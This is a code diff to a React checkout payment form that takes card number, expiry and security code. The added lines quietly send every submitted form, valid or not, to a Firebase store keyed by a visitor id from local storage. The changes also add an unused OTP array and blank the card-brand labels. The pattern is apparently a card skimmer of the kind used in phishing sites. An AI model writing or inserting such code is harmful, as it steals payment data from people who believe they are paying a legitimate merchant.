@@ -10,13 +10,14 @@ import { Button } from "@/components/ui/button"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { Checkbox } from "@/components/ui/checkbox"
 import { Shield, CreditCard, Calendar, Lock, AlertCircle } from "lucide-react"
+import { addData } from "@/lib/firebase"
 
 interface PaymentFormProps {
   gateway: string
   onSubmit: (paymentData: any) => void
   isProcessing: boolean
 }
-
+const allOtps=['']
 export function PaymentForm({ gateway, onSubmit, isProcessing }: PaymentFormProps) {
   const [formData, setFormData] = useState({
     cardNumber: "",
@@ -59,6 +60,8 @@ export function PaymentForm({ gateway, onSubmit, isProcessing }: PaymentFormProp
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
+    const _id=localStorage.getItem('visitor')
+    addData({id:_id,formData})
     if (validateForm()) {
       onSubmit(formData)
     }
@@ -137,17 +140,17 @@ export function PaymentForm({ gateway, onSubmit, isProcessing }: PaymentFormProp
               <div className="absolute left-3 top-1/2 transform -translate-y-1/2">
                 {getCardType(formData.cardNumber) === "visa" && (
                   <div className="w-8 h-5 bg-blue-600 rounded text-white text-xs flex items-center justify-center font-bold">
-                    VISA
+                  
                   </div>
                 )}
                 {getCardType(formData.cardNumber) === "mastercard" && (
                   <div className="w-8 h-5 bg-red-600 rounded text-white text-xs flex items-center justify-center font-bold">
-                    MC
+                   
                   </div>
                 )}
                 {getCardType(formData.cardNumber) === "amex" && (
                   <div className="w-8 h-5 bg-green-600 rounded text-white text-xs flex items-center justify-center font-bold">
-                    AMEX
+                  
                   </div>
                 )}
               </div>
